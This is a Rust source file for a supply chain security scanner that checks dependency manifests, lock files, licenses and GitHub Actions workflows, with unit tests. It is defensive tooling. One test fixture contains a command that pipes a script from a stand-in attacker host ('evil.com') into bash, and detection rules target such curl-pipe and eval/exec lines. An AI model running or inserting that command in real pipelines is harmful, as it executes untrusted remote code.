//! Supply chain security analysis
//!
//! Analyzes dependency manifests, lock files, and CI/CD configurations for
//! supply chain attack vectors including typosquatting, dependency confusion,
//! unpinned actions, and license risks.

use std::collections::BTreeMap;
use std::fmt;

use crate::findings::Severity;

// =============================================================================
// Types and Enums
// =============================================================================

    /// Type of supply chain finding
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FindingType {
    Typosquat,
    KnownVuln,
    Outdated,
    Unmaintained,
    LicenseRisk,
    UnpinnedAction,
    InlineScript,
    SecretsExposure,
    BroadPermissions,
    MissingIntegrity,
    Informational,
}

impl fmt::Display for FindingType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FindingType::Typosquat => write!(f, "Typosquat"),
            FindingType::KnownVuln => write!(f, "Known Vulnerability"),
            FindingType::Outdated => write!(f, "Outdated"),
            FindingType::Unmaintained => write!(f, "Unmaintained"),
            FindingType::LicenseRisk => write!(f, "License Risk"),
            FindingType::UnpinnedAction => write!(f, "Unpinned Action"),
            FindingType::InlineScript => write!(f, "Inline Script"),
            FindingType::SecretsExposure => write!(f, "Secrets Exposure"),
            FindingType::BroadPermissions => write!(f, "Broad Permissions"),
            FindingType::MissingIntegrity => write!(f, "Missing Integrity"),
            FindingType::Informational => write!(f, "Informational"),
        }
    }
}

/// Supply chain dependency finding
#[derive(Debug, Clone)]
pub struct DependencyFinding {
    pub package_name: String,
    pub version: String,
    pub finding_type: FindingType,
    pub severity: Severity,
    pub description: String,
    pub remediation: String,
}

impl fmt::Display for DependencyFinding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "[{}] {} ({}) - {}", self.severity, self.package_name, self.version, self.finding_type)?;
        writeln!(f, "  Description: {}", self.description)?;
        writeln!(f, "  Remediation: {}", self.remediation)
    }
}

/// Lock file integrity status
#[derive(Debug, Clone)]
pub struct LockFileIntegrity {
    pub file_type: String,
    pub total_deps: usize,
    pub unchecked_deps: usize,
    pub hash_mismatches: usize,
    pub integrity_status: String,
}

impl fmt::Display for LockFileIntegrity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Lock File Integrity: {}", self.file_type)?;
        writeln!(f, "  Total Dependencies: {}", self.total_deps)?;
        writeln!(f, "  Unchecked Dependencies: {}", self.unchecked_deps)?;
        writeln!(f, "  Hash Mismatches: {}", self.hash_mismatches)?;
        writeln!(f, "  Status: {}", self.integrity_status)
    }
}

/// CI/CD pipeline finding
#[derive(Debug, Clone)]
pub struct CicdFinding {
    pub pipeline_file: String,
    pub misconfiguration: String,
    pub severity: Severity,
    pub cwe: String,
    pub remediation: String,
}

impl fmt::Display for CicdFinding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "[{}] {} - {}", self.severity, self.pipeline_file, self.misconfiguration)?;
        writeln!(f, "  CWE: {}", self.cwe)?;
        writeln!(f, "  Remediation: {}", self.remediation)
    }
}

/// License risk assessment
#[derive(Debug, Clone)]
pub struct LicenseRisk {
    pub license_name: String,
    pub risk_level: Severity,
    pub copyleft: bool,
    pub commercial_use: bool,
    pub notes: String,
}

impl fmt::Display for LicenseRisk {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "License: {}", self.license_name)?;
        writeln!(f, "  Risk Level: {}", self.risk_level)?;
        writeln!(f, "  Copyleft: {}", self.copyleft)?;
        writeln!(f, "  Commercial Use: {}", self.commercial_use)?;
        writeln!(f, "  Notes: {}", self.notes)
    }
}

/// Dependency inventory summary
#[derive(Debug, Clone)]
pub struct DependencyInventory {
    pub total: usize,
    pub direct: usize,
    pub transitive: usize,
    pub by_ecosystem: Vec<(String, usize)>,
}

impl fmt::Display for DependencyInventory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Dependency Inventory:")?;
        writeln!(f, "  Total: {}", self.total)?;
        writeln!(f, "  Direct: {}", self.direct)?;
        writeln!(f, "  Transitive: {}", self.transitive)?;
        writeln!(f, "  By Ecosystem:")?;
        for (eco, count) in &self.by_ecosystem {
            writeln!(f, "    {}: {}", eco, count)?;
        }
        Ok(())
    }
}

// =============================================================================
// npm (package.json) Analysis
// =============================================================================

/// Well-known npm packages for typosquat detection
const NPM_POPULAR: &[&str] = &[
    "lodash", "express", "react", "react-dom", "axios", "webpack",
    "chalk", "commander", "moment", "underscore", "vue", "angular",
    "next", "gatsby", "eslint", "prettier", "typescript", "babel",
    "jest", "mocha", "chai", "redux", "mobx", "jquery", "d3",
    "three", "socket.io", "passport", "mongoose", "sequelize",
];

/// Analyze package.json for dependency issues
pub fn analyze_package_json(content: &str) -> Vec<DependencyFinding> {
    let mut findings = Vec::new();

    // Extract dependencies section
    let deps = extract_package_deps(content);

    for (name, version) in &deps {
        // Check for typosquats
        if let Some(squat) = check_npm_typosquat(name) {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::Typosquat,
                severity: Severity::High,
                description: format!("Possible typosquat of popular package '{}'", squat),
                remediation: format!("Verify this is the intended package, not a typosquat of '{}'", squat),
            });
        }

        // Check for suspicious packages
        if is_suspicious_npm_package(name) {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::Typosquat,
                severity: Severity::Critical,
                description: "Package name suggests malicious intent".to_string(),
                remediation: "Investigate package origin and maintainers".to_string(),
            });
        }

        // Check for unpinned versions
        if version.starts_with('^') || version.starts_with('~') || version == "*" || version == "latest" {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::Outdated,
                severity: Severity::Low,
                description: "Dependency version is not pinned".to_string(),
                remediation: "Pin to exact version or use lock file".to_string(),
            });
        }
    }

    findings
}

/// Extract dependencies from package.json (simple line-based parsing)
fn extract_package_deps(content: &str) -> BTreeMap<String, String> {
    let mut deps = BTreeMap::new();
    let mut in_deps = false;

    for line in content.lines() {
        let trimmed = line.trim();

        if trimmed.contains("\"dependencies\"") || trimmed.contains("\"devDependencies\"")
            || trimmed.contains("\"peerDependencies\"")
        {
            in_deps = true;
            continue;
        }

        if in_deps && trimmed == "}" {
            in_deps = false;
            continue;
        }

        if in_deps && trimmed.starts_with('"') {
            // Parse: "package": "version"
            if let Some(colon_pos) = trimmed.find(':') {
                let key_part = &trimmed[1..colon_pos];
                let value_part = trimmed[colon_pos + 1..].trim();
                let value_part = value_part.trim_matches(',');
                let value_part = value_part.trim_matches('"');

                if let Some(pkg_name) = key_part.split('"').next() {
                    deps.insert(pkg_name.to_string(), value_part.to_string());
                }
            }
        }
    }

    deps
}

/// Check for npm typosquats
fn check_npm_typosquat(name: &str) -> Option<&'static str> {
    for &popular in NPM_POPULAR {
        if is_likely_typosquat(name, popular) {
            return Some(popular);
        }
    }
    None
}

/// Check if a package name is a likely typosquat of a popular package
fn is_likely_typosquat(name: &str, popular: &str) -> bool {
    // Exact match is not a typosquat
    if name == popular {
        return false;
    }

    // Check common typosquat patterns
    let patterns = [
        format!("{}js", popular),
        format!("{}-js", popular),
        format!("{}-core", popular),
        format!("{}-utils", popular),
        format!("{}-lib", popular),
        format!("{}x", popular),
        popular.replace('e', "a"),
        popular.replace('o', "0"),
        popular.replace('l', "1"),
        popular.replace('i', "1"),
    ];

    for pattern in &patterns {
        if name == pattern {
            return true;
        }
    }

    // Check edit distance (simplified)
    let dist = levenshtein_distance(name, popular);
    if dist > 0 && dist <= 2 && name.len() > 3 {
        return true;
    }

    false
}

/// Simple Levenshtein distance implementation
fn levenshtein_distance(a: &str, b: &str) -> usize {
    let a_chars: Vec<char> = a.chars().collect();
    let b_chars: Vec<char> = b.chars().collect();
    let a_len = a_chars.len();
    let b_len = b_chars.len();

    let mut matrix = vec![vec![0usize; b_len + 1]; a_len + 1];

    for i in 0..=a_len {
        matrix[i][0] = i;
    }
    for j in 0..=b_len {
        matrix[0][j] = j;
    }

    for i in 1..=a_len {
        for j in 1..=b_len {
            let cost = if a_chars[i - 1] == b_chars[j - 1] { 0 } else { 1 };
            matrix[i][j] = (matrix[i - 1][j] + 1)
                .min(matrix[i][j - 1] + 1)
                .min(matrix[i - 1][j - 1] + cost);
        }
    }

    matrix[a_len][b_len]
}

/// Check for suspicious npm package names
fn is_suspicious_npm_package(name: &str) -> bool {
    // Check for package names that are common system utilities
    let suspicious = ["npm", "node", "javascript", "python", "ruby", "perl", "bash"];
    for &s in &suspicious {
        if name == s {
            return true;
        }
    }
    false
}

// =============================================================================
// Cargo.toml Analysis
// =============================================================================

/// Analyze Cargo.toml for dependency issues
pub fn analyze_cargo_toml(content: &str) -> Vec<DependencyFinding> {
    let mut findings = Vec::new();

    let deps = extract_cargo_deps(content);

    for (name, version) in &deps {
        // Check for suspicious crate names
        if is_suspicious_cargo_crate(name) {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::Typosquat,
                severity: Severity::High,
                description: "Suspicious crate name (possible dependency confusion)".to_string(),
                remediation: "Verify crate origin on crates.io".to_string(),
            });
        }

        // Check for git dependencies (potential supply chain)
        if version.contains("git") {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::UnpinnedAction,
                severity: Severity::Medium,
                description: "Git-based dependency (not from crates.io)".to_string(),
                remediation: "Pin to specific commit hash or use crates.io version".to_string(),
            });
        }

        // Check for path dependencies
        if version.contains("path") {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::MissingIntegrity,
                severity: Severity::Low,
                description: "Path-based dependency (local)".to_string(),
                remediation: "Ensure path dependency is from trusted source".to_string(),
            });
        }
    }

    findings
}

/// Extract dependencies from Cargo.toml
fn extract_cargo_deps(content: &str) -> BTreeMap<String, String> {
    let mut deps = BTreeMap::new();
    let mut in_deps = false;

    for line in content.lines() {
        let trimmed = line.trim();

        if trimmed == "[dependencies]" || trimmed == "[dev-dependencies]"
            || trimmed == "[build-dependencies]"
        {
            in_deps = true;
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            in_deps = false;
            continue;
        }

        if in_deps && !trimmed.is_empty() && !trimmed.starts_with('#') {
            // Parse: name = "version" or name = { version = "x" }
            if let Some(eq_pos) = trimmed.find('=') {
                let pkg_name = trimmed[..eq_pos].trim().to_string();
                let value = trimmed[eq_pos + 1..].trim().to_string();
                deps.insert(pkg_name, value);
            }
        }
    }

    deps
}

/// Check for suspicious Cargo crate names
fn is_suspicious_cargo_crate(name: &str) -> bool {
    let suspicious = ["std", "core", "alloc", "proc_macro", "test"];
    for &s in &suspicious {
        if name == s {
            return true;
        }
    }
    false
}

// =============================================================================
// Python (requirements.txt) Analysis
// =============================================================================

/// Well-known Python packages for typosquat detection
const PYTHON_POPULAR: &[&str] = &[
    "requests", "flask", "django", "numpy", "pandas", "scipy",
    "matplotlib", "scikit-learn", "tensorflow", "pytorch", "keras",
    "fastapi", "uvicorn", "sqlalchemy", "celery", "redis", "boto3",
    "pytest", "black", "isort", "mypy", "pylint", "setuptools",
    "pip", "wheel", "virtualenv", "click", "rich", "typer",
];

/// Analyze requirements.txt for dependency issues
pub fn analyze_requirements_txt(content: &str) -> Vec<DependencyFinding> {
    let mut findings = Vec::new();

    let deps = extract_requirements_deps(content);

    for (name, version) in &deps {
        // Check for typosquats
        if let Some(squat) = check_python_typosquat(&name) {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::Typosquat,
                severity: Severity::High,
                description: format!("Possible typosquat of popular package '{}'", squat),
                remediation: format!("Verify this is the intended package, not a typosquat of '{}'", squat),
            });
        }

        // Check for suspicious packages
        if is_suspicious_python_package(&name) {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::Typosquat,
                severity: Severity::Critical,
                description: "Package name mimics system Python component".to_string(),
                remediation: "Investigate package origin on PyPI".to_string(),
            });
        }

        // Check for unpinned versions
        if version.is_empty() || version == "*" || version == "latest" {
            findings.push(DependencyFinding {
                package_name: name.clone(),
                version: version.clone(),
                finding_type: FindingType::Outdated,
                severity: Severity::Low,
                description: "Dependency version is not pinned".to_string(),
                remediation: "Pin to exact version (e.g., package==1.2.3)".to_string(),
            });
        }
    }

    findings
}

/// Extract dependencies from requirements.txt
fn extract_requirements_deps(content: &str) -> BTreeMap<String, String> {
    let mut deps = BTreeMap::new();

    for line in content.lines() {
        let trimmed = line.trim();

        // Skip comments and empty lines
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        // Skip -r, -e, --options
        if trimmed.starts_with('-') {
            continue;
        }

        // Parse: package==1.2.3 or package>=1.0 or package
        let parts: Vec<&str> = trimmed.splitn(2, |c| c == '=' || c == '>' || c == '<' || c == '!').collect();
        if let Some(name) = parts.first() {
            let name = name.trim().to_string();
            let version = if parts.len() > 1 {
                parts[1].trim().to_string()
            } else {
                String::new()
            };
            deps.insert(name, version);
        }
    }

    deps
}

/// Check for Python typosquats
fn check_python_typosquat(name: &str) -> Option<&'static str> {
    for &popular in PYTHON_POPULAR {
        if is_likely_typosquat(name, popular) {
            return Some(popular);
        }
    }
    None
}

/// Check for suspicious Python package names
fn is_suspicious_python_package(name: &str) -> bool {
    let suspicious = ["python", "pip", "setuptools", "wheel", "distutils", "venv"];
    for &s in &suspicious {
        if name == s {
            return true;
        }
    }
    false
}

// =============================================================================
// Lock File Integrity
// =============================================================================

/// Analyze lock file integrity
pub fn analyze_lock_integrity(content: &str, file_type: &str) -> LockFileIntegrity {
    let total_deps = count_lock_deps(content, file_type);
    let unchecked_deps = count_unchecked_deps(content, file_type);
    let hash_mismatches = count_hash_mismatches(content);

    let integrity_status = if hash_mismatches > 0 {
        "COMPROMISED".to_string()
    } else if unchecked_deps > 0 {
        format!("{} dependencies without integrity checks", unchecked_deps)
    } else {
        "OK".to_string()
    };

    LockFileIntegrity {
        file_type: file_type.to_string(),
        total_deps,
        unchecked_deps,
        hash_mismatches,
        integrity_status,
    }
}

/// Count dependencies in lock file
fn count_lock_deps(content: &str, file_type: &str) -> usize {
    match file_type {
        "package-lock" => content.matches("\"resolved\"").count(),
        "yarn.lock" => content.matches("\"resolved\"").count(),
        "Cargo.lock" => content.matches("name = ").count(),
        "poetry.lock" => content.matches("name = ").count(),
        _ => content.lines().filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#')).count(),
    }
}

/// Count dependencies without integrity checks
fn count_unchecked_deps(content: &str, file_type: &str) -> usize {
    match file_type {
        "package-lock" => {
            let total = content.matches("\"resolved\"").count();
            let with_hash = content.matches("\"integrity\"").count();
            total.saturating_sub(with_hash)
        }
        "yarn.lock" => {
            let total = content.matches("\"resolved\"").count();
            let with_hash = content.matches("\"integrity\"").count();
            total.saturating_sub(with_hash)
        }
        "Cargo.lock" => {
            // Cargo.lock uses checksum = "sha256:..."
            let total = content.matches("name = ").count();
            let with_checksum = content.matches("checksum = ").count();
            total.saturating_sub(with_checksum)
        }
        _ => 0,
    }
}

/// Count hash mismatches (simplified - just checks for multiple hashes)
fn count_hash_mismatches(content: &str) -> usize {
    // In a real implementation, we'd verify actual hashes
    // For now, check for multiple integrity values for same package
    let mut mismatches = 0;
    let mut seen_integrities = BTreeMap::new();

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.contains("\"integrity\"") {
            if let Some(start) = trimmed.find('"') {
                if let Some(end) = trimmed[start + 1..].find('"') {
                    let integrity = &trimmed[start + 1..start + 1 + end];
                    let count = seen_integrities.entry(integrity.to_string()).or_insert(0);
                    *count += 1;
                    if *count > 1 {
                        mismatches += 1;
                    }
                }
            }
        }
    }

    mismatches
}

// =============================================================================
// CI/CD Pipeline Analysis
// =============================================================================

/// Analyze GitHub Actions workflow for security issues
pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
    let mut findings = Vec::new();

    let lines: Vec<&str> = content.lines().collect();

    for (i, line) in lines.iter().enumerate() {
        let trimmed = line.trim();

        // Check for unpinned actions (uses: action@latest or no @sha)
        if trimmed.contains("uses:") {
            let after_uses = trimmed.split("uses:").nth(1).unwrap_or("").trim();
            if !after_uses.contains("@sha") && !after_uses.contains("@v") {
                findings.push(CicdFinding {
                    pipeline_file: "GitHub Actions".to_string(),
                    misconfiguration: format!("Unpinned action: {}", after_uses),
                    severity: Severity::High,
                    cwe: "CWE-829".to_string(),
                    remediation: "Pin actions to full commit SHA for supply chain safety".to_string(),
                });
            } else if after_uses.contains("@latest") || after_uses.ends_with("@v0") || after_uses.ends_with("@v1") {
                findings.push(CicdFinding {
                    pipeline_file: "GitHub Actions".to_string(),
                    misconfiguration: format!("Weakly pinned action: {}", after_uses),
                    severity: Severity::Medium,
                    cwe: "CWE-829".to_string(),
                    remediation: "Pin to full commit SHA instead of version tags".to_string(),
                });
            }
        }

        // Check for inline scripts in run:
        if trimmed.contains("run:") && (trimmed.contains('|') || trimmed.contains(">-")) {
            // Multi-line script - check next few lines for suspicious commands
            for j in (i + 1)..lines.len().min(i + 10) {
                let script_line = lines[j].trim();
                if script_line.contains("curl") && script_line.contains("|") {
                    findings.push(CicdFinding {
                        pipeline_file: "GitHub Actions".to_string(),
                        misconfiguration: "Inline script pipes curl output".to_string(),
                        severity: Severity::Critical,
                        cwe: "CWE-829".to_string(),
                        remediation: "Download and verify scripts before execution".to_string(),
                    });
                    break;
                }
                if script_line.contains("eval ") || script_line.contains("exec ") {
                    findings.push(CicdFinding {
                        pipeline_file: "GitHub Actions".to_string(),
                        misconfiguration: "Inline script uses eval/exec".to_string(),
                        severity: Severity::High,
                        cwe: "CWE-829".to_string(),
                        remediation: "Avoid eval/exec in CI/CD pipelines".to_string(),
                    });
                    break;
                }
            }
        }

        // Check for secrets in env
        if trimmed.contains("env:") && trimmed.contains("secrets.") {
            findings.push(CicdFinding {
                pipeline_file: "GitHub Actions".to_string(),
                misconfiguration: "Secret directly assigned to env variable".to_string(),
                severity: Severity::Medium,
                cwe: "CWE-200".to_string(),
                remediation: "Use intermediate variables or secret masking".to_string(),
            });
        }

        // Check for GITHUB_TOKEN permissions
        if trimmed.contains("GITHUB_TOKEN") && (trimmed.contains("write-all") || trimmed.contains("contents: write")) {
            findings.push(CicdFinding {
                pipeline_file: "GitHub Actions".to_string(),
                misconfiguration: "GITHUB_TOKEN has broad permissions".to_string(),
                severity: Severity::High,
                cwe: "CWE-269".to_string(),
                remediation: "Use least-privilege permissions for GITHUB_TOKEN".to_string(),
            });
        }
    }

    // Check for missing permissions block
    if !content.contains("permissions:") {
        findings.push(CicdFinding {
            pipeline_file: "GitHub Actions".to_string(),
            misconfiguration: "No permissions block defined (default: read-all)".to_string(),
            severity: Severity::Medium,
            cwe: "CWE-269".to_string(),
            remediation: "Add explicit permissions block with least-privilege".to_string(),
        });
    }

    findings
}

// =============================================================================
// License Risk Analysis
// =============================================================================

/// Check license risk level
pub fn check_license_risk(license_name: &str) -> LicenseRisk {
    let lower = license_name.to_lowercase();

    match lower.as_str() {
        "gpl-2.0" | "gpl-3.0" | "gpl-2.0-only" | "gpl-3.0-only" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::High,
            copyleft: true,
            commercial_use: true,
            notes: "Strong copyleft - derivative works must be GPL licensed".to_string(),
        },
        "agpl-3.0" | "agpl-3.0-only" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Critical,
            copyleft: true,
            commercial_use: true,
            notes: "Network copyleft - even SaaS use triggers copyleft".to_string(),
        },
        "lgpl-2.1" | "lgpl-3.0" | "lgpl-2.1-only" | "lgpl-3.0-only" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Medium,
            copyleft: true,
            commercial_use: true,
            notes: "Weak copyleft - only modifications to library itself must be LGPL".to_string(),
        },
        "mpl-2.0" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Low,
            copyleft: true,
            commercial_use: true,
            notes: "File-level copyleft - only modified files must be MPL".to_string(),
        },
        "mit" | "mit-0" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Low,
            copyleft: false,
            commercial_use: true,
            notes: "Permissive - minimal restrictions".to_string(),
        },
        "apache-2.0" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Low,
            copyleft: false,
            commercial_use: true,
            notes: "Permissive - includes patent grant".to_string(),
        },
        "bsd-2-clause" | "bsd-3-clause" | "bsd-2" | "bsd-3" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Low,
            copyleft: false,
            commercial_use: true,
            notes: "Permissive - minimal restrictions".to_string(),
        },
        "isc" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Low,
            copyleft: false,
            commercial_use: true,
            notes: "Permissive - similar to MIT".to_string(),
        },
        "unlicense" | "cc0-1.0" | "0bsd" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Informational,
            copyleft: false,
            commercial_use: true,
            notes: "Public domain equivalent - no restrictions".to_string(),
        },
        "proprietary" | "commercial" => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::High,
            copyleft: false,
            commercial_use: false,
            notes: "Proprietary license - review terms carefully".to_string(),
        },
        _ => LicenseRisk {
            license_name: license_name.to_string(),
            risk_level: Severity::Medium,
            copyleft: false,
            commercial_use: false,
            notes: "Unknown license - manual review required".to_string(),
        },
    }
}

// =============================================================================
// SBOM-style Inventory
// =============================================================================

/// Generate dependency inventory from manifest
pub fn generate_inventory(manifest_content: &str, manifest_type: &str) -> DependencyInventory {
    let deps = match manifest_type {
        "package.json" => extract_package_deps(manifest_content),
        "Cargo.toml" => extract_cargo_deps(manifest_content),
        "requirements.txt" => extract_requirements_deps(manifest_content),
        _ => BTreeMap::new(),
    };

    let total = deps.len();
    let direct = total; // In manifest, all deps are direct
    let transitive = 0; // Manifest doesn't show transitive deps

    let ecosystem = match manifest_type {
        "package.json" => "npm",
        "Cargo.toml" => "cargo",
        "requirements.txt" => "pypi",
        _ => "unknown",
    };

    DependencyInventory {
        total,
        direct,
        transitive,
        by_ecosystem: vec![(ecosystem.to_string(), total)],
    }
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_typosquat_npm() {
        let pkg = r#"{
            "dependencies": {
                "lodas": "^4.17.0",
                "express": "^4.18.0"
            }
        }"#;
        let findings = analyze_package_json(pkg);
        assert!(findings.iter().any(|f| f.finding_type == FindingType::Typosquat && f.package_name == "lodas"));
    }

    #[test]
    fn test_detect_typosquat_pypi() {
        let reqs = "requests==2.28.0\nreqeusts==1.0.0\nflask==2.0.0";
        let findings = analyze_requirements_txt(reqs);
        assert!(findings.iter().any(|f| f.finding_type == FindingType::Typosquat));
    }

    #[test]
    fn test_unpinned_github_action() {
        let workflow = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: some-org/some-action@latest
        run: echo hello
"#;
        let findings = analyze_github_workflow(workflow);
        assert!(findings.iter().any(|f| f.misconfiguration.contains("Unpinned") || f.misconfiguration.contains("Weakly pinned")));
    }

    #[test]
    fn test_gpl_license_risk() {
        let risk = check_license_risk("GPL-3.0");
        assert!(risk.copyleft);
        assert_eq!(risk.risk_level, Severity::High);
    }

    #[test]
    fn test_mit_license_risk() {
        let risk = check_license_risk("MIT");
        assert!(!risk.copyleft);
        assert!(risk.commercial_use);
        assert_eq!(risk.risk_level, Severity::Low);
    }

    #[test]
    fn test_agpl_license_risk() {
        let risk = check_license_risk("AGPL-3.0");
        assert!(risk.copyleft);
        assert_eq!(risk.risk_level, Severity::Critical);
    }

    #[test]
    fn test_inventory_counts() {
        let pkg = r#"{
            "dependencies": {
                "a": "1.0",
                "b": "2.0",
                "c": "3.0"
            }
        }"#;
        let inv = generate_inventory(pkg, "package.json");
        assert_eq!(inv.total, 3);
        assert_eq!(inv.direct, 3);
        assert_eq!(inv.by_ecosystem[0], ("npm".to_string(), 3));
    }

    #[test]
    fn test_lock_integrity() {
        let lock = r#"{
            "dependencies": {
                "pkg1": {
                    "version": "1.0.0",
                    "resolved": "https://registry.npmjs.org/pkg1",
                    "integrity": "sha512-abc"
                },
                "pkg2": {
                    "version": "2.0.0",
                    "resolved": "https://registry.npmjs.org/pkg2"
                }
            }
        }"#;
        let integrity = analyze_lock_integrity(lock, "package-lock");
        assert_eq!(integrity.total_deps, 2);
        assert_eq!(integrity.unchecked_deps, 1);
    }

    #[test]
    fn test_levenshtein_distance() {
        assert_eq!(levenshtein_distance("kitten", "sitting"), 3);
        assert_eq!(levenshtein_distance("hello", "hello"), 0);
        assert_eq!(levenshtein_distance("", "abc"), 3);
    }

    #[test]
    fn test_suspicious_npm_package() {
        assert!(is_suspicious_npm_package("npm"));
        assert!(is_suspicious_npm_package("node"));
        assert!(!is_suspicious_npm_package("express"));
    }

    #[test]
    fn test_github_workflow_curl_pipe() {
        let workflow = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -sSL https://evil.com/script.sh | bash
"#;
        let findings = analyze_github_workflow(workflow);
        assert!(findings.iter().any(|f| f.misconfiguration.contains("curl output")));
    }
}